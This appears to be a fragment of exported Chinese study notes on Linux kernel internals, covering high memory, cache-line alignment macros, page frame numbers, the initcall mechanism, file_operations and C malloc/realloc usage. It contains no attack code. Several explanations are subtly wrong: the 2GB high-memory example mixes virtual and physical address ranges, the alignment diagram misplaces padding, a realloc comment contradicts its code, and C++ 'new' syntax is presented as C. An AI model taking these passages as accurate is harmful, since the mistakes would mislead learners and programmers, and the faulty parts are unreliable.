id=\"内存管理\"><a href=\"#内存管理\" class=\"headerlink\" title=\"内存管理\"></a>内存管理</h2><ol>\n<li>高端内存（High Memory）</li>\n</ol>\n<p>高端内存（High Memory） 是一种相对于内核空间中的“低端内存”（Low Memory）概念的术语。它指的是一些物理内存区域，特别是在 32 位系统中，由于地址空间的限制，它们无法直接映射到内核的虚拟地址空间中。通常，高端内存是指那些超出了内核直接映射到虚拟地址空间的物理内存区域。<br>    •    32 位系统的地址空间限制：在传统的 32 位系统中，虚拟地址空间通常只有 4GB，而其中的一部分（通常 3GB）用于用户空间，剩下的（通常 1GB）用于内核空间。由于这个限制，内核不能直接访问所有的物理内存，尤其是对于大于 1GB 的内存，无法直接映射到内核的虚拟地址空间中。因此，高端内存指的是位于内核虚拟地址空间映射范围之外的物理内存。<br>    •    64 位系统：由于 64 位系统的地址空间极其庞大，内核几乎可以直接访问所有物理内存，因此在 64 位系统中没有高端内存的概念。</p>\n<ol start=\"2\">\n<li>线性映射</li>\n</ol>\n<p>线性映射 是一种将物理地址空间直接映射到虚拟地址空间的方式。在这种映射方式下，物理地址与虚拟地址是等价的或者是一个固定的偏移量。例如，内核在启动时会设置一些映射，使得物理地址 0x1000 会直接映射到虚拟地址 0x1000。<br>    •    内核的线性映射：在内核中，低端内存通常会通过线性映射被直接映射到内核虚拟地址空间中，这样内核可以直接访问这些物理内存。<br>    •    高端内存与线性映射的关系：在 32 位系统中，高端内存并不会直接映射到内核的虚拟地址空间。也就是说，高端内存的物理页面没有通过线性映射直接映射到内核空间的虚拟地址，而需要通过其他机制（如交换、分段、分页）来访问。</p>\n<ol start=\"3\">\n<li>虚拟地址与物理地址</li>\n</ol>\n<p>在 Linux 内核中，struct page 结构体代表物理内存页面，其中有一个 virtual 字段，它通常指向该物理页面对应的虚拟地址。<br>    •    对于低端内存，内核可以通过线性映射将物理地址直接映射到虚拟地址，所以 virtual 字段会直接指向内核虚拟地址空间中的一个地址。<br>    •    对于高端内存，由于内核的虚拟地址空间可能没有直接映射到物理页面，virtual 字段可能为空或指向一个特殊的虚拟地址，这个虚拟地址通常是通过一些额外的机制（如交换或者高端内存的分页）来实现访问的。</p>\n<ol start=\"4\">\n<li>总结<br> •    高端内存：指的是那些在 32 位系统中，由于地址空间限制，不能直接映射到内核虚拟地址空间的物理内存。<br> •    线性映射：是一种将物理地址直接映射到虚拟地址的机制。在 32 位系统中，低端内存是线性映射的，但高端内存则无法直接映射到内核的虚拟地址空间。<br> •    对于高端内存，内核通过 分段 或 分页 等方式来访问这些内存区域，而不直接通过线性映射进行访问。</li>\n</ol>\n<p>因此，“高端内存不会线性映射到内核地址空间” 是指，高端内存的物理页面并不能像低端内存那样通过简单的线性映射直接访问，而需要通过其他机制来访问。</p>\n<p>在 32 位系统中，由于虚拟地址空间的大小限制，内核无法直接访问所有物理内存，尤其是当物理内存大于 1GB 时。这主要是因为 32 位系统的虚拟地址空间只有 4GB，而这个空间被划分为用户空间和内核空间。</p>\n<p>32 位系统的虚拟地址空间划分<br>    •    虚拟地址空间总大小：在 32 位系统中，虚拟地址空间的总大小为 4GB（2^32）。<br>    •    用户空间：通常使用 3GB 的地址空间（0x00000000 到 0xBFFFFFFF）。<br>    •    内核空间：剩余的 1GB 用于内核空间（0xC0000000 到 0xFFFFFFFF）。</p>\n<p>因此，在 32 位系统中，内核最多只能直接访问 1GB 的物理内存。如果系统的物理内存大于 1GB，那么这部分内存就无法直接映射到内核虚拟地址空间中，这部分内存就属于 高端内存（High Memory）。</p>\n<p>举个例子</p>\n<p>假设一台 32 位的计算机具有 2GB 的物理内存：<br>    •    物理内存：2GB（2^31 字节），其中包括低端内存（Low Memory）和高端内存（High Memory）。<br>    •    低端内存：在虚拟地址空间中的前 1GB（0x00000000 到 0xBFFFFFFF），可以直接映射到内核空间。<br>    •    高端内存：超出 1GB 的内存（0xC0000000 到 0xFFFFFFFF 之间的内存）不能直接映射到内核虚拟地址空间，因为内核空间已经满了。</p>\n<p>在这种情况下，物理内存的前 1GB（低端内存）可以通过内核的线性映射直接访问，而物理内存中超过 1GB 的部分（高端内存）则无法通过简单的线性映射直接访问。这就意味着，内核无法直接访问这些高端内存中的页面。</p>\n<p>如何访问高端内存</p>\n<p>虽然高端内存不能直接通过线性映射访问，但内核提供了其他机制来访问它：<br>    1.    通过 vmalloc() 和 kmap() 访问：内核会通过 vmalloc() 和 kmap() 等机制将高端内存映射到内核的虚拟地址空间中，从而允许内核访问这些内存。高端内存不直接映射到内核虚拟地址空间，而是通过分页的方式进行分段映射。<br>    2.    通过 highmem（高端内存）区访问：高端内存通常会在内核中通过 highmem 区域进行管理。内核通过特殊的内存管理函数来访问这部分内存，通常需要进行分页或其他方式来映射。</p>\n<p>为什么高端内存不能直接映射</p>\n<p>主要原因是虚拟地址空间的限制。在 32 位系统中，内核空间最大只能有 1GB，因此如果物理内存超过 1GB，剩余的内存就不能直接映射到内核空间。这就迫使内核通过特殊的分页技术来访问这些高端内存。</p>\n<p>64 位系统的改进</p>\n<p>在 64 位系统中，虚拟地址空间大大增加，内核可以直接访问大多数物理内存，无需像 32 位系统那样处理高端内存的问题。64 位系统的虚拟地址空间可以达到 2^64，几乎不再受到地址空间大小的限制，因此不再需要像在 32 位系统中那样对高端内存进行特殊处理。</p>\n<p>好的，让我们重新梳理一下这段代码的逻辑，并且通过一个具体的例子来深入理解它的含义和作用。</p>\n<p>背景：为什么需要按缓存行对齐</p>\n<p>在多核处理器（SMP）系统中，缓存一致性和数据访问效率非常关键。缓存行（Cache Line）是 CPU 缓存中最小的存储单位，大多数现代处理器的缓存行大小通常为 64 字节。如果一个数据结构跨越了两个或多个缓存行，那么访问该数据时就可能导致 缓存行失效（cache line ping-pong），即每个 CPU 核心都在不同的缓存行中加载同一个数据，导致性能下降。因此，将数据按缓存行对齐可以避免这个问题，确保数据尽量放置在单独的缓存行中，从而提高性能。</p>\n<p>分析这段代码的作用</p>\n<p>#if !defined(____cacheline_internodealigned_in_smp)<br>#if defined(CONFIG_SMP)<br>#define ____cacheline_internodealigned_in_smp <br>    <strong>attribute</strong>((<strong>aligned</strong>(1 &lt;&lt; (INTERNODE_CACHE_SHIFT))))<br>#else<br>#define ____cacheline_internodealigned_in_smp<br>#endif<br>#endif</p>\n<p>这段代码的目的是根据系统是否支持 SMP（对称多处理）（即是否有多个 CPU 核心）来决定是否为数据结构设置缓存行对齐属性。</p>\n<p>代码解释<br>    1.    #if !defined(____cacheline_internodealigned_in_smp)<br>这一行检查是否已经定义了宏 ____cacheline_internodealigned_in_smp。如果没有定义，才会继续定义它，避免重复定义。<br>    2.    #if defined(CONFIG_SMP)<br>这行检查是否定义了 CONFIG_SMP。CONFIG_SMP 是一个内核配置选项，表示是否启用了对称多处理（即是否有多个 CPU 核心）。<br>    •    如果启用了 SMP（多核处理），则进行缓存行对齐的处理。<br>    •    如果没有启用 SMP（单核系统），则不进行缓存行对齐。<br>    3.    #define ____cacheline_internodealigned_in_smp <br>如果启用了 SMP（即 CONFIG_SMP 被定义），则定义 ____cacheline_internodealigned_in_smp 为 <strong>attribute</strong>((<strong>aligned</strong>(1 &lt;&lt; (INTERNODE_CACHE_SHIFT))))。<br>    •    INTERNODE_CACHE_SHIFT 是一个宏，通常表示缓存行大小的对数。例如，如果缓存行大小是 64 字节，那么 INTERNODE_CACHE_SHIFT 就是 6，因为 64 = 2^6。<br>    •    <strong>attribute</strong>((<strong>aligned</strong>(…))) 是 GCC 提供的一个编译器属性，表示将数据对齐到指定的字节边界。<br>    •    1 &lt;&lt; (INTERNODE_CACHE_SHIFT) 表示将数据对齐到 64 字节的边界。<br>所以，启用 SMP 时，____cacheline_internodealigned_in_smp 宏会被定义为 <strong>attribute</strong>((<strong>aligned</strong>(64)))，这确保数据会按 64 字节对齐。<br>    4.    #else<br>如果没有启用 SMP（单核系统），则 ____cacheline_internodealigned_in_smp 不会做任何事情，即不做对齐操作。<br>    5.    #endif<br>结束条件编译语句。</p>\n<p>总结：<br>    •    SMP（多核系统）：如果系统支持多核，____cacheline_internodealigned_in_smp 被定义为 <strong>attribute</strong>((<strong>aligned</strong>(64)))，确保数据按缓存行（64 字节）对齐，从而减少缓存失效的风险。<br>    •    单核系统：不做缓存行对齐操作。</p>\n<p>具体例子：</p>\n<p>假设我们有一个结构体，并希望在多核处理器系统中确保它按缓存行对齐：</p>\n<p>struct my_struct {<br>    int a;<br>    char b;<br>    float c;<br>};</p>\n<p>没有对齐的情况：</p>\n<p>在没有使用 ____cacheline_internodealigned_in_smp 时，编译器会根据结构体成员的对齐要求来确定内存布局：<br>    •    int 通常需要对齐到 4 字节边界。<br>    •    char 通常对齐到 1 字节边界。<br>    •    float 通常对齐到 4 字节边界。</p>\n<p>如果这个结构体没有使用缓存行对齐，内存布局可能像这样：</p>\n<p>+——–+——-+——–+——–+<br>|   a    |   b   |   c    | padding|<br>+——–+——-+——–+——–+<br>  4 bytes   1 byte   4 bytes   3 bytes</p>\n<pre><code>•    a 占用 4 字节并对齐到 4 字节。\n•    b 占用 1 字节，并且它的对齐要求为 1 字节。\n•    c 占用 4 字节，并且对齐到 4 字节。\n</code></pre>\n<p>为了使 c 能对齐到 4 字节，可能需要在 b 后添加 3 字节的填充。</p>\n<p>启用缓存行对齐后的情况：</p>\n<p>现在，假设启用了 ____cacheline_internodealigned_in_smp，并且系统支持 SMP（多核）。这时，结构体会按 64 字节对齐，也就是说，结构体的起始地址会对齐到 64 字节的边界。</p>\n<p>假设 INTERNODE_CACHE_SHIFT = 6，即缓存行大小为 64 字节，结构体的内存布局会变成：</p>\n<p>+———————————–+<br>|   Padding (64 bytes)              |<br>+———————————–+<br>|   a   |   b   |   c   |   padding |<br>+———————————–+<br>  4 bytes   1 byte   4 bytes   55 bytes</p>\n<pre><code>•    结构体的首地址被对齐到 64 字节的边界。\n•    内存填充：由于结构体本身的大小是 12 字节，但为了保证结构体的起始地址是 64 字节的倍数，结构体会被填充到 64 字节的边界。即，结构体的起始位置可能会有 64 字节的填充。\n</code></pre>\n<p>效果和意义：<br>    •    避免缓存失效：将数据对齐到缓存行的边界可以减少跨越缓存行的访问，从而减少缓存失效。<br>    •    性能优化：对于多核系统，避免数据跨越多个缓存行能提高内存访问效率，减少 CPU 核心间的缓存一致性问题。</p>\n<p>总结：<br>    •    这段代码的核心目的是在 多核处理器（SMP）系统 中，将结构体的起始地址对齐到 64 字节的边界，以减少缓存一致性问题和提高访问效率。<br>    •    按缓存行对齐确保数据结构在内存中的布局能够有效利用 CPU 缓存，避免多个 CPU 核心间由于访问同一数据而导致的缓存行失效问题。</p>\n<h3 id=\"9-2\"><a href=\"#9-2\" class=\"headerlink\" title=\"9.2\"></a>9.2</h3><p>在 Linux 内核中，“PFN”（Page Frame Number，页帧号）是用来索引物理页（physical page）的一种整数编号。下面分别解释代码里的两个概念：</p>\n<ol>\n<li>ARCH_PFN_OFFSET 是什么？</li>\n</ol>\n<p>在一些架构上（尤其是 ARM、MIPS 等嵌入式或移动平台），物理内存不一定从物理地址 0x00000000 开始，也可能从更高的物理地址起步（例如某些平台保留了低地址做其他映射、外设 IO 等）。<br>    •    ARCH_PFN_OFFSET 就是为了对齐“页帧号（PFN）”和实际物理地址而引入的一个“偏移量”。<br>    •    PFN 是“物理地址 / PAGE_SIZE”的逻辑编号。如果系统的物理地址不是从 0 起步，而是从某个偏移地址开始，那么 ARCH_PFN_OFFSET 就用于在内核中对这些 PFN 进行校正。</p>\n<p>简而言之：ARCH_PFN_OFFSET = (物理内存起始地址) / PAGE_SIZE（在特定平台中可能还含有更多固定映射或保留区间导致的修正）。</p>\n<p>在大多数常见的 x86_64 PC 服务器或桌面上，ARCH_PFN_OFFSET 一般为 0；而在某些嵌入式或 ARM 平台上，这个值会是一个正整数，让内核知道第一个可用物理页帧编号实际是多少。</p>\n<ol start=\"2\">\n<li>pfn 是什么？</li>\n</ol>\n<p>pfn 是 “Page Frame Number”（页帧号），用来标识系统中的第几页物理内存。<br>    •    如果 PAGE_SIZE = 4KB，那么 PFN=0 指向物理地址 0x00000000 ~ 0x00000FFF 这一页；PFN=1 对应 0x00001000 ~ 0x00001FFF，依此类推。<br>    •    因此 pfn 与物理地址的关系：</p>\n<p>物理地址 = pfn * PAGE_SIZE</p>\n<pre><code>•    内核提供了 pfn_to_page(pfn) 这样的方法，把一个 PFN 转换为对应的 struct page *，这样就能访问或操作该物理页的元数据。\n</code></pre>\n<p>在这段代码里：</p>\n<p>pfn = i + ARCH_PFN_OFFSET;<br>if (!pfn_valid(pfn))<br>    continue;<br>p = pfn_to_page(pfn);<br>…</p>\n<pre><code>•    i 从 0 遍历到 num_physpages（即系统总共可见的物理页数），然后加上 ARCH_PFN_OFFSET 得到实际有效的 PFN。\n•    pfn_valid(pfn) 检查这个 PFN 是否属于系统真正存在或可管理的物理内存区域，可能有的 PFN 范围并没有对应物理页（例如“洞”（holes）或保留区）。\n•    如果是有效 PFN，再用 pfn_to_page() 拿到对应的 struct page 描述符，然后进行各种标记检查（如 PageLocked、PageDirty 等）。\n</code></pre>\n<p>小结<br>    •    ARCH_PFN_OFFSET：平台/架构相关的 PFN 偏移，用于对齐实际物理地址在页帧编号体系中的起点。<br>    •    pfn：Page Frame Number，标识物理页的编号，用于在内核中管理、索引所有物理页面。</p>\n"},{"_content":"### 宏定义\n\n\n#### __init:\n`#define __init\t\t__section(\".init.text\") __cold  __latent_entropy __noinitretpoline __nocfi `\n\n__section(\".init.text\")：\n\n这个指令将函数放置在输出可执行文件的特定段中，本例中为“.init.text”段。这个段通常用于系统启动时需要的初始化程序，初始化完成后可以丢弃，以节省内存。\n__cold：\n\n这个属性告诉编译器，该函数不太可能经常执行。这可以帮助编译器优化代码以提高性能，可能通过安排函数的方式来减少其在不经常使用时对指令缓存性能的影响。\n__latent_entropy：\n\n这个属性用于增加系统的熵（随机性），这在安全方面特别有用，例如，使依赖于可预测执行模式的攻击更加困难。\n__noinitretpoline：\n\n这个属性表明该函数不需要retpoline（返回跳板），这是一种针对某些类型的投机执行侧通道攻击（如Spectre）的缓解技术。\n__nocfi：\n\n这个指令告诉编译器不对这个函数应用控制流完整性（CFI）检查。控制流完整性是一种安全特性，通过确保间接函数调用转到有效函数来帮助防止某些类型的攻击。对于某些低级函数，跳过CFI可能是必要的，因为CFI的开销或限制可能会干扰函数的操作。\n\n#### 从device_initcall查看宏定义\ndevice_initcall(binder_init)就是将指向binder_init的函数指针，注册在.initcall6.init段里。内核启动时，会调用它，对Binder驱动进行初始化。\n```\ntypedef int (*initcall_t)(void);\ntypedef initcall_t initcall_entry_t;\n\n/* Format: <modname>__<counter>_<line>_<fn> */\n#define __initcall_id(fn)\t\t\t\t\t\\\n\t__PASTE(__KBUILD_MODNAME,\t\t\t\t\\\n\t__PASTE(__,\t\t\t\t\t\t\\\n\t__PASTE(__COUNTER__,\t\t\t\t\t\\\n\t__PASTE(_,\t\t\t\t\t\t\\\n\t__PASTE(__LINE__,\t\t\t\t\t\\\n\t__PASTE(_, fn))))))\n\n/* Format: __<prefix>__<iid><id> */\n#define __initcall_name(prefix, __iid, id)\t\t\t\\\n\t__PASTE(__,\t\t\t\t\t\t\\\n\t__PASTE(prefix,\t\t\t\t\t\t\\\n\t__PASTE(__,\t\t\t\t\t\t\\\n\t__PASTE(__iid, id))))\n      \n#define __initcall_section(__sec, __iid)\t\t\t\\\n\t#__sec \".init\"\n\n#define __initcall_stub(fn, __iid, id)\tfn\n\n#define ____define_initcall(fn, __unused, __name, __sec)\t\\\n\tstatic initcall_t __name __used \t\t\t\\\n\t\t__attribute__((__section__(__sec))) = fn;\n#endif\n\n#define __unique_initcall(fn, id, __sec, __iid)\t\t\t\\\n\t____define_initcall(fn,\t\t\t\t\t\\\n\t\t__initcall_stub(fn, __iid, id),\t\t\t\\\n\t\t__initcall_name(initcall, __iid, id),\t\t\\\n\t\t__initcall_section(__sec, __iid))\n\n#define ___define_initcall(fn, id, __sec)\t\t\t\\\n\t__unique_initcall(fn, id, __sec, __initcall_id(fn))\n\n#define __define_initcall(fn, id) ___define_initcall(fn, id, .initcall##id)\n\n#define device_initcall(fn)\t\t__define_initcall(fn, 6)\n```\n\ndevice_initcall(binder_init)展开就是：\n```\ndevice_initcall(binder_init)\n        ↓\n__define_initcall(binder_init, 6)\n        ↓\n___define_initcall(binder_init, 6, .initcall6)\n        ↓\n__unique_initcall(binder_init, 6, .initcall6, <modname>__<counter>_<line>_binder_init)\n        ↓\n____define_initcall(binder_init, \n        binder_init,\n        __initcall__<modname>__<counter>_<line>_binder_init6,\n        .initcall6.init)\n        ↓\nstatic initcall_t __initcall__<modname>__<counter>_<line>_binder_init6 __used \n      __attribute__((__section__(.initcall6.init))) = binder_init;\n```\n\n##### \\_\\_initcall_id\n这段代码定义了一个宏 __initcall_id(fn)，其目的是生成一个唯一的标识符，用于内核初始化函数（initcall）。这个宏通过多层嵌套的 __PASTE 宏，将几个预处理器变量和函数名结合成一个连续的字符串。下面是对这个宏的详细解释：\n\n*组件解释*\n* \\_\\_KBUILD_MODNAME：\n这是一个由内核构建系统定义的宏，它表示正在编译的模块的名称。如果代码不是为模块编译的，它通常是内核的名称或为空。\n* \\_\\_COUNTER\\_\\_：\n这是一个特殊的预处理器变量，每次出现在源代码中时都会递增。\\_\\_COUNTER__ 用于在编译过程中生成唯一的序列号，确保每次宏展开时都得到一个不同的值。是GNU 编译器的非标准编译器扩展，可以认为它是一个计数器，代表一个整数，它的值一般被初始化为0，在每次编译器编译到它时，会自动 +1。\n* \\_\\_LINE\\_\\_：\n这个宏展开为当前代码行的行号。它在源代码中是唯一的，除非多个宏展开发生在同一行。\n* fn：\n这是宏的参数，表示将要注册的初始化函数的名字。\n* __PASTE 宏\n__PASTE 宏的目的是将两个参数连接在一起（没有空格）。__initcall_id 宏通过多次使用 __PASTE，将上述元素拼接成一个单一的、唯一的标识符。这种连续使用 __PASTE 的方式确保了不同部分之间没有空格，并且生成的字符串是平滑连续的。\n\n*完整的宏展开过程*\n    如果我们假设：\n    \\_\\_KBUILD_MODNAME 是 \"mykernelmodule\"\n    \\_\\_COUNTER\\_\\_ 当前是 42\n    \\_\\_LINE\\_\\_ 是 123\n    fn 是 init_my_device\n宏展开的结果将是：`mykernelmodule__42_123_init_my_device`\n这个结果是由以下步骤生成的：\n1. 首先连接 mykernelmodule 和 _，结果是 mykernelmodule__。\n2. 然后连接前面的结果和 42，得到 mykernelmodule__42。\n3. 接着连接 _ 和 123，再和前面的结果连接，得到 mykernelmodule__42_123。\n4. 最后将 init_my_device 通过 _ 连接上去，得到最终的字符串 mykernelmodule__42_123_init_my_device。\n\n```\n#define __initcall_section(__sec, __iid)\t\t\t\\\n\t#__sec \".init\"\n这个宏 __initcall_section(__sec, __iid) 定义了一个用于生成内核初始化代码段名的格式。宏的工作是把传入的 __sec 和字符串 .init 拼接起来，构成一个用于特定初始化函数的ELF段（section）名称。这里，__iid 参数虽然在宏定义中出现，但在实际的字符串连接操作中没有被使用，可能是为了保持与其他相关宏的参数格式一致性，或为未来的扩展预留。\n```\n详细解释：\n* #__sec：\n这部分使用了字符串化操作符 #，它会将宏参数转化为一个字符串。这意味着传入的宏参数 __sec 会被转换成一个字面量字符串。\n* \".init\"：\n这是一个直接的字符串常量，表示初始化段的后缀。在Linux内核中，用于初始化代码的段通常以 .init 结尾，比如 .init.text、.init.data 等。\n拼接：\n\n宏中没有明显的连接操作（如 ## 运算符），但在宏的用法中，这两部分（#__sec 和 \".init\"）通过宏替换自然连接成一个完整的字符串。\n使用例子：\n假设有如下调用：\n\n__initcall_section(my_section, 123)\n根据宏的定义，这将展开为：\n\n\"my_section.init\"\n这里，my_section 被字符串化并与 .init 后缀连接，生成一个新的字符串，表示一个内核ELF段的名称。\n\n#### initcall机制\n当我们试图将一个驱动程序加载进内核时，我们需要提供一个`xxx_init()`函数。这样内核才会定位到该函数，加载驱动，初始化驱动。\n`binder_init()`就是这样一个初始化驱动的函数。但是怎么向内核注册这样一个函数呢？直观的做法是维护一个初始化驱动的函数指针的数组，将`binder_init()`添加进该数组中。不过这样在多人开发时，容易造成编码冲突。\nlinux采用了更优雅的方法——initcall机制：\n在内核镜像文件中，自定义一个段，这个段里面专门用来存放这些初始化函数的地址，内核启动时，只需要在这个段地址处取出函数指针，一个个执行即可。\n##### .initcallXX.init段\n`.initcallXX.init`段就是专门用来存放各个内核模块的初始化函数的地址。\n\n`device_initcall(fn)`就是表示将指向fn的函数指针，存放在`.initcall6.init`段。类似的宏定义有：\n```\n#define pure_initcall(fn)\t\t__define_initcall(fn, 0)              →  .initcall0.init\n#define core_initcall(fn)\t\t__define_initcall(fn, 1)              →  .initcall1.init\n#define core_initcall_sync(fn)\t\t__define_initcall(fn, 1s)             →  .initcall1s.init\n#define postcore_initcall(fn)\t\t__define_initcall(fn, 2)              →  .initcall2.init\n#define postcore_initcall_sync(fn)\t__define_initcall(fn, 2s)             →  .initcall2s.init\n#define arch_initcall(fn)\t\t__define_initcall(fn, 3)              →  .initcall3.init\n#define arch_initcall_sync(fn)\t\t__define_initcall(fn, 3s)             →  .initcall3s.init\n#define subsys_initcall(fn)\t\t__define_initcall(fn, 4)              →  .initcall4.init\n#define subsys_initcall_sync(fn)\t__define_initcall(fn, 4s)             →  .initcall4s.init\n#define fs_initcall(fn)\t\t\t__define_initcall(fn, 5)              →  .initcall5.init\n#define fs_initcall_sync(fn)\t\t__define_initcall(fn, 5s)             →  .initcall5s.init\n#define rootfs_initcall(fn)\t\t__define_initcall(fn, rootfs)         →  .initcallrootfs.init\n#define device_initcall(fn)\t\t__define_initcall(fn, 6)              →  .initcall6.init\n#define device_initcall_sync(fn)\t__define_initcall(fn, 6s)             →  .initcall6s.init\n#define late_initcall(fn)\t\t__define_initcall(fn, 7)              →  .initcall7.init\n#define late_initcall_sync(fn)\t\t__define_initcall(fn, 7s)             →  .initcall7s.init\n```\n\n#### .initcallXX.init段的定义\n.initcallXX.init段的定义是在common/include/asm-generic/vmlinux.lds.h和common/arch/arm64/kernel/vmlinux.lds.S中。\n```\n//common/include/asm-generic/vmlinux.lds.h\n#define INIT_CALLS_LEVEL(level)\t\t\t\t\t\t\\\n\t\t__initcall##level##_start = .;\t\t\t\t\\\n\t\tKEEP(*(.initcall##level##.init))\t\t\t\\\n\t\tKEEP(*(.initcall##level##s.init))\t\t\t\\\n\n#define INIT_CALLS\t\t\t\t\t\t\t\\\n\t\t__initcall_start = .;\t\t\t\t\t\\\n\t\tKEEP(*(.initcallearly.init))\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(0)\t\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(1)\t\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(2)\t\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(3)\t\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(4)\t\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(5)\t\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(rootfs)\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(6)\t\t\t\t\t\\\n\t\tINIT_CALLS_LEVEL(7)\t\t\t\t\t\\\n\t\t__initcall_end = .;\n                \n//common/arch/arm64/kernel/vmlinux.lds.S\nSECTIONS\n{\n        ...\n        .init.data : {\n\t\tINIT_DATA\n\t\tINIT_SETUP(16)\n\t\tINIT_CALLS\n\t\tCON_INITCALL\n\t\tINIT_RAM_FS\n\t\t*(.init.altinstructions .init.bss)\t/* from the EFI stub */\n\t}\n        ...\n}\n```\n参考：https://www.cnblogs.com/jianhua1992/p/16852793.html\n解释：\n* *() \n在链接器脚本中确实用作通配符。在链接器脚本的语法中，*() 用于匹配符合特定模式的所有符号或者段(section)。这种用法允许链接器指令应用于多个相关的符号或段，而不需要单独列举它们。这是组织和控制链接输出文件的一个强大特性，特别是在操作系统内核或其他复杂软件系统的构建中。\n\nKEEP(*(.initcall##level##.init)) 和 KEEP(*(.initcall##level##s.init)) 使用了通配符 * 来包含所有在特定命名模式的段中的符号。这里的通配符 * 表示匹配所有符号，而括号内的表达式定义了要匹配的段名。例如：\n\n.initcall0.init\n.initcall1.init\n.initcall0s.init\n.initcall1s.init\n\n*(.initcall##level##.init)：\n\n这表示匹配所有在 .initcall<level>.init 段中的符号。例如，如果 level 是 0，则匹配 .initcall0.init 段中的所有符号。\n*(.initcall##level##s.init)：\n\n类似地，这表示匹配所有在 .initcall<level>s.init 段中的符号。这个 s 后缀可能代表某种特定类型的初始化调用，如同步初始化调用。\n为什么使用 KEEP\nKEEP 指令在链接器脚本中用来确保即使没有被程序的其他部分直接引用，也不会被链接器优化掉（即不被删除）。这对于初始化代码特别重要，因为这些代码在执行完毕后通常不会再被其他运行时代码直接引用，但它们在系统启动阶段是必需的。通过使用 KEEP，可以保证这些重要的初始化段不会因为“看似”未被使用而被剔除，确保内核能够按预期顺序执行这些初始化步骤。\n\n这种机制是内核和其他底层系统软件能够精确控制初始化过程的关键，特别是在涉及到内存和资源优化的上下文中。\n\n* ##在宏定义中的作用是将多个符号连接成一个符号，并不将其字符串化\n\n### 标号元素\n```\nstatic const struct file_operations __maybe_unused kmem_fops = {\n    .llseek     = memory_lseek,\n    .read       = read_kmem,\n    .write      = write_kmem,\n    .mmap       = mmap_kmem,\n    .open       = open_kmem,\n#ifndef CONFIG_MMU\n    .get_unmapped_area = get_unmapped_area_mem,\n    .mmap_capabilities = memory_mmap_capabilities,\n#endif\n};\n```\n#### 解释\n1. 结构体声明与类型\nstruct file_operations：这是一个预定义的结构体类型，通常在Linux内核源代码中定义，用于描述文件操作相关的函数指针。\n2. 修饰符和存储类\nstatic：表示这个结构体变量 kmem_fops 的作用域限制在定义它的文件内，外部文件不能访问它。\nconst：表示这个结构体变量是常量，一旦初始化后，其内容不应被修改。\n__maybe_unused：这是一个编译器指示，用于告诉编译器这个变量可能在代码中未被使用，这可以避免编译器发出未使用变量的警告。这通常用在可能因为不同的编译配置而使用或不使用的变量上。\n3. 结构体成员初始化\n.llseek = memory_lseek，.read = read_kmem，等：这种使用点（.）后跟成员名的初始化方式是C99标准中引入的指定初始化器（designated initializer）。它允许在初始化结构体时直接指定每个成员的值，而不需要依赖于成员在结构体中的顺序。\n4. 条件编译\n#ifndef CONFIG_MMU ... #endif：这是预处理指令，用于条件编译。它检查 CONFIG_MMU 是否未被定义。如果未定义 CONFIG_MMU，则编译器会编译这两行代码：\n.get_unmapped_area = get_unmapped_area_mem\n.mmap_capabilities = memory_mmap_capabilities\n这通常在不同的硬件配置或内核配置选项下使用，以适应不同的系统需求。\n\n当在内核模块中将 memory_lseek 函数指定给 file_operations 结构体的 .llseek 成员时，任何针对该设备文件的 lseek 系统调用最终都会调用你的 memory_lseek 函数。\n#### 使用\n这里是详细的调用流程：\n\n用户空间调用：当用户空间的程序调用 lseek() 函数时，这个调用最初由标准C库（例如glibc）封装，该库将系统调用参数封装为适当的系统调用请求。\n系统调用转换：系统调用接口在内核中接收到这个请求后，会找到与文件描述符关联的 file 结构体实例。\n文件操作结构体：每个打开的文件在内核中都有一个与之关联的 file 结构体，这个结构体包含了指向 file_operations 结构体的指针。file_operations 结构体为各种文件操作定义了具体的函数指针，如打开、读取、写入、定位等。\n调用 .llseek：如果对应的 file_operations 结构体中的 .llseek 成员被设置为 memory_lseek，那么内核就会调用 memory_lseek 函数来处理这个定位请求。\n执行定位操作：memory_lseek 函数将根据提供的参数（文件指针、偏移量和起始位置标志）计算新的文件位置，并将这个新位置返回给调用者。如果操作有效，返回的就是新的文件偏移量；如果无效（如偏移量无效或操作不被支持），则返回错误码。\n\n\nc语言结构体大小计算规则：\n1、结构体变量的首地址，必须是结构体变量中的“最大基本数据类型成员所占字节数”的整数倍。（对齐）\n2、结构体变量中的每个成员相对于结构体首地址的偏移量，都是该成员基本数据类型所占字节的整数倍。（对齐）\n3、结构体变量的总大小，为结构体变量中“最大基本数据类型成员所占字节数”的整数倍（补齐）\n\n--\ntypedef struct Work_{\n    int num;\n\n}Work_;\n\n如果不对自己起别名，直接用\nWork_ work=new Work_(); 会报错，必须用 struct Work_ work=new Work_();\n--\n\nc:内存申请\n\n栈：占最大内存中的2M,开辟内存的方式是静态内存开辟，比如：函数内声明变量，函数方法结束后会自动回收\n堆：占最大内存中的80%，动态内存开辟，不会自动回收,必须手动回收。malloc()开辟，free()释放\n\n利用realloc扩展内存，如果原来的内存不足以向下扩展，会重新找一块足够的内存，因此，指针指向的地址会变动。\n动态申请内存时有可能会失败，所以会返回null,如果是扩展内存返回null,那么需要把malloc的内存释放掉\n释放时，也务必进行空指针判断，释放完最好把指针置空\n'''\n//动态开辟内存\nvoid dyMemoryTest(int num,int newNum){\n    int* arrPoint= (int*)malloc(10*1024*1024*sizeof(int)); //40M\n\n    //必须手动释放\n    if(arrPoint){\n        free(arrPoint);  \n    }\n    int* arrPoint2=(int*)malloc(num*sizeof(int));\n    if(arrPoint2){\n        for(int i=0;i<num;i++){\n            *(arrPoint2+i)=i;\n        }\n    }\n    int* arrPoint3 =(int *)realloc(arrPoint2,(num+newNum)*sizeof(int));\n    if(arrPoint3){\n        for(int i=num;i<num+newNum;i++){\n            *(arrPoint3+i)=i;\n        }\n        for(int i=0;i<num+newNum;i++){\n            LOGD(\"the number is %d ,the value is %d\",i,*(arrPoint3+i));\n        }\n        //成功了，只释放旧指针就行\n        free(arrPoint3);\n        arrPoint3= nullptr;\n    }else{\n        //没有成功，释放旧指针\n        if(arrPoint2){\n            free(arrPoint2);\n        }\n    }\n}\n'''\n\nlinux config example:\n\nCONFIG_FTRACE_SYSCALLS 是一个内核配置选项，用于控制是否启用系统调用的函数追踪（ftrace）功能.\n\nlinux/syscalls.h\n```\n#ifdef 